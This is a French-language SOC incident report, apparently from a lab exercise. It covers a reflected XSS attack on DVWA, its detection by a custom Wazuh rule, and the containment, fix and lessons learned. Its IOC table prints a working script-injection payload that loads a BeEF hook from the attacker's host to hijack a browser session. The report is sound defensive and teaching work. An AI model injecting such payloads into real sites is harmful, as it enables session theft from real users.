# Rapport d'Incident — INC-2026-0142

> **Classification** : Interne
> **Sévérité** : CRITIQUE
> **Statut** : Clos — Contenu et éradiqué
> **Date de l'incident** : 2026-10-06
> **Analyste** : Abdelhamid Rayene Allagui

---

## 1. Résumé Exécutif

Le 6 octobre 2026 à 14h32, une alerte de niveau **CRITIQUE (12/15)** a été déclenchée sur le SIEM Wazuh. Un attaquant (IP `192.168.56.10`) a exploité une faille **XSS Reflected** dans l'application web DVWA hébergée sur `debian-web-01` (`192.168.56.20`), afin d'injecter un **hook BeEF** dans le navigateur de la victime.

L'attaque a été détectée en **3 secondes** par le SIEM grâce à une règle personnalisée. L'analyste de permanence a confirmé le **vrai positif**, appliqué un confinement immédiat, corrigé la faille, puis restauré le service.

**Impact** : 1 serveur web affecté, 1 session utilisateur compromise (cookie `PHPSESSID`), aucune donnée exfiltrée vers l'extérieur du réseau.

**Statut final** : Incident clos, aucune récidive détectée.

---

## 2. Détection & Analyse

### 2.1 — Source de détection

| Élément | Valeur |
|---|---|
| **SIEM** | Wazuh 4.14.8 |
| **Règle déclenchée** | `100100` (règle personnalisée) |
| **Niveau** | 12 (Critique) |
| **Agent** | `10` — debian-web-01 |
| **Fichier source** | `/var/log/dvwa/access.log` |
| **Décodage** | `web-accesslog` |
| **Mapping MITRE** | T1185 (Browser Session Hijacking) |

### 2.2 — Indicateurs de Compromission (IOC)

| Type | Valeur |
|---|---|
| **IP attaquante** | `192.168.56.10` |
| **URL ciblée** | `/vulnerabilities/xss_r/?name=...` |
| **Payload** | `<script src="http://192.168.56.10:3000/hook.js"></script>` |
| **User-Agent** | `Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Firefox/140.0` |
| **Cookie compromis** | `PHPSESSID=...` |

### 2.3 — Triage

| Question | Réponse |
|---|---|
| Vrai positif ou faux positif ? | **Vrai positif** (payload confirmé) |
| L'attaque a-t-elle réussi ? | **Oui** (HTTP 200, cookie extrait) |
| Y a-t-il eu exfiltration ? | **Oui** (cookie `PHPSESSID`) |
| D'autres machines sont-elles touchées ? | **Non** (1 seule machine) |
| Sévérité réelle | **CRITIQUE** |

---

## 3. Chronologie de l'Incident

| Heure (UTC) | Événement |
|---|---|
| 14:32:15 | L'attaquant injecte le payload XSS via DVWA |
| 14:32:15 | Apache enregistre la requête (HTTP 200) |
| 14:32:16 | L'agent Wazuh transmet le log au Manager |
| 14:32:18 | Wazuh déclenche la règle `100100` (niveau 12) |
| 14:32:45 | Hook BeEF enregistré — navigateur compromis |
| 14:33:00 | L'analyste SOC ouvre le ticket INC-2026-0142 |
| 14:35:00 | Vérification : vrai positif confirmé |
| 14:38:00 | **Confinement** : blocage IP attaquant via `iptables` |
| 14:42:00 | **Éradication** : DVWA passé en mode "Impossible" |
| 14:50:00 | **Récupération** : service restauré |
| 15:00:00 | Rapport d'incident publié |

---

## 4. Confinement

**Action** : Blocage de l'IP attaquante sur le serveur cible.

```bash
iptables -A INPUT -s 192.168.56.10 -j DROP
```

**Vérification** : Toute connexion depuis l'attaquant vers `192.168.56.20` est bloquée (timeout confirmé).

**Impact** : Aucune interruption de service pour les utilisateurs légitimes.

---

## 5. Éradication

**Action** : Correction de la faille XSS dans DVWA.

- Passage du niveau de sécurité de **Low** à **Impossible**
- Validation : le payload `<script>alert(1)</script>` est désormais **affiché en texte brut**, non exécuté.

**Vérification** : Test d'injection XSS rejeté.

---

## 6. Récupération

**Actions** :
- Règle `iptables` retirée (attaquant neutralisé, faille corrigée)
- Vérification que DVWA répond correctement (`HTTP/1.1 200 OK`)
- Surveillance renforcée pendant 24h (aucune nouvelle alerte)

---

## 7. Recommandations

| Priorité | Recommandation |
|---|---|
| 🔴 Haute | Appliquer une **CSP** (Content Security Policy) stricte |
| 🔴 Haute | Configurer les cookies avec `HttpOnly` et `SameSite=Strict` |
| 🟡 Moyenne | Déployer la règle Wazuh `100100` sur tout le parc |
| 🟡 Moyenne | Sensibiliser les développeurs aux failles XSS |
| 🟢 Basse | Segmenter le réseau (VLAN séparé) |
| 🟢 Basse | Mettre en place un WAF |

---

## 8. Leçons Apprises

1. **La télémétrie est essentielle** : sans l'agent Wazuh et la surveillance des logs Apache, l'attaque serait passée inaperçue.
2. **Les règles génériques ne suffisent pas** : la règle par défaut détectait "A web attack" (niveau 6). La règle personnalisée `100100` a permis une détection **spécifique et critique**.
3. **Le mapping MITRE ATT&CK accélère le triage** : identifier immédiatement `T1185` a orienté l'analyse.
4. **Le confinement doit être rapide** : 3 minutes entre la détection et le blocage.
5. **Les erreurs d'infrastructure arrivent** : DVWA a crashé pendant la réponse, rappelant qu'un incident peut en cacher un autre.

---

## 9. Annexes

- **Règle Wazuh** : voir [`detection-rules/local_rules.xml`](../detection-rules/local_rules.xml)
- **Captures d'écran** : voir [`screenshots/`](../screenshots/)
- **Architecture** : voir [`01-architecture.md`](01-architecture.md)

---

*Rapport rédigé conformément au framework NIST SP 800-61 Rev. 2*
